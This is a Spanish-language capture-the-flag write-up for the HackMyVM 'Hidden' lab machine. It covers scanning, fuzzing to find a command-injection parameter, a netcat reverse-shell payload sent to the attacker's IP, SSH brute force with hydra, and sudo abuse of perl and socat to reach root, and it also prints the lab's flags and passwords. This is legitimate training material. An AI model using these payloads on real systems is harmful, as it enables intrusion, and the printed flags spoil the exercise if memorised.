---
icon: flag
---

# Hidden HackMyVM (Easy- Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-04-16 03:12 EDT
Nmap scan report for 192.168.1.178
Host is up (0.00032s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 b8:10:9f:60:e6:2b:62:cb:3a:8c:8c:60:4b:1d:99:b9 (RSA)
|   256 64:b5:b8:e6:0f:79:23:4d:4a:c0:9b:0f:a7:75:67:c9 (ECDSA)
|_  256 d1:11:e4:07:8a:fe:06:72:64:62:28:ca:e3:29:7b:a0 (ED25519)
80/tcp open  http    Apache httpd 2.4.38 ((Debian))
|_http-server-header: Apache/2.4.38 (Debian)
|_http-title: Level 1
MAC Address: 08:00:27:8A:F8:AD (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.02 seconds
```

Veremos que hay un puerto `80` en la que hay una pagina web alojada, vamos a entrar dentro a ver que vemos:

<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

Veremos esto lo que parece ser un codigo codificado en signos, si investigamos un poco el tipo de cifrado se llama `braille binario visual` o tambien `Rosicrucian`

Despues si inspeccionamos el codigo veremos lo siguiente:

```html
<!-- format xxx.xxxxxx.xxx -->
```

Vemos que lo que podamos decodificar lo tendremos que poner en dicho formato, por lo que vamos a irnos a la siguiente pagina y dejarlo de esta forma:

URL = [Decod Rosicrucian Cipher](https://www.dcode.fr/rosicrucian-cipher)

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

Vemos que el resultado es `SYSHIDDENHMV` por lo que tendremos que pasarlo al formato que encontramos:

```
SYS.HIDDEN.HMV
```

Por lo que vemos puede ser un dominio, vamos añadirlo a nuestro archivo `hosts` de la siguiente forma:

```shell
nano /etc/hosts

#Dentro del nano
<IP>           SYS.HIDDEN.HMV
```

Lo guardamos y entraremos a dicho dominio de la siguinte forma:

```
URL = http://SYS.HIDDEN.HMV/
```

Veremos lo siguiente:

<figure><img src="../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>

Veremos que tendremos que pasar otro nivel, pero en este caso no veremos nada interesante, por lo que vamos a realizar un poco de `fuzzing` de la siguiente forma:

## Gobuster

```shell
gobuster dir -u http://sys.hidden.hmv/ -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sys.hidden.hmv/
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html,php,txt
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/users                (Status: 200) [Size: 939]
/members              (Status: 200) [Size: 954]
/index.html           (Status: 200) [Size: 282]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/weapon               (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Veremos unas cosas interesantes, pero entre ellas `/weapon` si entramos lo veremos todo blanco por lo que podemos creer que se esta utilizando algun `PHP` vamos a realizar un poco mas de `fuzzing` de nuevo en dicho directorio.

```shell
gobuster dir -u http://sys.hidden.hmv/weapon -w <WORDLIST> -x html,php,txt -t 100 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://sys.hidden.hmv/weapon
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,txt,html
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/index.html           (Status: 200) [Size: 0]
/loot.php             (Status: 200) [Size: 0]
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
Progress: 882240 / 882244 (100.00%)
===============================================================
Finished
===============================================================
```

Vemos un archivo bastante interesante llamado `/loot.php` vamos a realizar otro pequeño `fuzzing` pero esta vez en busca de algun parametro que permita leer archivos o ejecutar comandos a ver si hay suerte.

## Escalate user www-data

### FFUF

```shell
ffuf -u 'http://sys.hidden.hmv/weapon/loot.php?FUZZ=../../../../../etc/passwd' -w <WORDLIST> -fs 0
```

Pero veremos que no funciona directamente leyendo archivos, por lo que vamos a probar con comandos:

```shell
ffuf -u 'http://sys.hidden.hmv/weapon/loot.php?FUZZ=whoami' -w <WORDLIST> -fs 0
```

Info:

```

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sys.hidden.hmv/weapon/loot.php?FUZZ=whoami
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0
________________________________________________

hack                    [Status: 200, Size: 9, Words: 1, Lines: 2, Duration: 99ms]
:: Progress: [220560/220560] :: Job [1/1] :: 4545 req/sec :: Duration: [0:00:50] :: Errors: 0 ::
```

Veremos que esta vez si ha funcionado, y el parametro es `hack` por lo que vamos a probarlo de la siguiente forma:

```
URL = http://sys.hidden.hmv/weapon/loot.php?hack=whoami
```

Info:

```
www-data
```

Veremos que realmente funciona, por lo que vamos a generarnos una `reverse shell` de la siguiente forma:

```
URL = http://sys.hidden.hmv/weapon/loot.php?hack=nc%20-c%20sh%20192.168.1.146%207777
```

Vamos a ponernos a la escucha de la siguiente manera:

```shell
nc -lvnp <PORT>
```

Ahora si vamos a enviar el comando desde la pagina como lo pusimos de la forma anterior y si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.1.146] from (UNKNOWN) [192.168.1.178] 39522
whoami
www-data
```

Vamos a sanitizar la shell (TTY).

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user toreto

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for www-data on hidden:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on hidden:
    (toreto) NOPASSWD: /usr/bin/perl
```

Veremos que podemos ejecutar el binario `perl` como el usuario `toreto` por lo que haremos lo siguiente:

```shell
sudo -u toreto perl -e 'exec "/bin/bash";'
```

Info:

```
toreto@hidden:~$ whoami
toreto
```

## Escalate user atenea

Si vamos a la `home` del usuario `atenea` veremos una carpeta oculta llamada `.hidden` en la que podremos entrar y veremos un archivo llamado `atenea.txt` el cual podremos leer y veremos lo siguiente:

> atenea.txt

```
sys7959hmv
sys7960hmv
sys7961hmv
sys7962hmv
sys7963hmv
sys7964hmv
sys7965hmv
sys7966hmv
sys7967hmv
sys7968hmv
sys7969hmv
sys7970hmv
..............................<RESTO>..............................................
```

Por lo que vemos es un listado de lo que podrian ser contraseñas del usuario `atenea` por lo que haremos lo siguiente:

Desde la maquina victima abriremos un servidor de `python3`:

```shell
python3 -m http.server
```

Desde la maquina atacante vamos a descargarnos dicho archivo.

```shell
wget http://<IP_VICTIM>:8000/atenea.txt
```

### Hydra

Una vez descargado vamos realizar la fuerza bruta con `hydra`:

```shell
hydra -l atenea -P atenea.txt ssh://<IP_VICTIM> -t 64 -I
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-04-16 04:03:30
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 64 tasks per 1 server, overall 64 tasks, 561 login tries (l:1/p:561), ~9 tries per task
[DATA] attacking ssh://192.168.1.178:22/
[22][ssh] host: 192.168.1.178   login: atenea   password: sys8423hmv
1 of 1 target successfully completed, 1 valid password found
[WARNING] Writing restore file because 17 final worker threads did not complete until end.
[ERROR] 17 targets did not resolve or could not be connected
[ERROR] 0 target did not complete
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-04-16 04:04:10
```

Veremos que ha funcionado, por lo que vamos a conectarnos por `SSH` con dichas credenciales:

### SSH

```shell
ssh atenea@<IP>
```

Metemos como contraseña `sys8423hmv` y veremos que estaremos dentro, por lo que leeremos la `flag` del usuario.

> user.txt

```
hmv{c4HqWSzRVKNDpTL}
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for atenea on hidden:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User atenea may run the following commands on hidden:
    (root) NOPASSWD: /usr/bin/socat
```

Veremos que podemos ejecutar el binario `socat` como el usuario `root` por lo que haremos lo siguiente:

```shell
sudo socat stdin exec:/bin/bash
```

Info:

```
whoami
root
```

Veremos que seremos `root` por lo que leeremos la `flag` de `root`.

> root.txt

```
hmv{2Mxtnwrht0ogHB6}
```
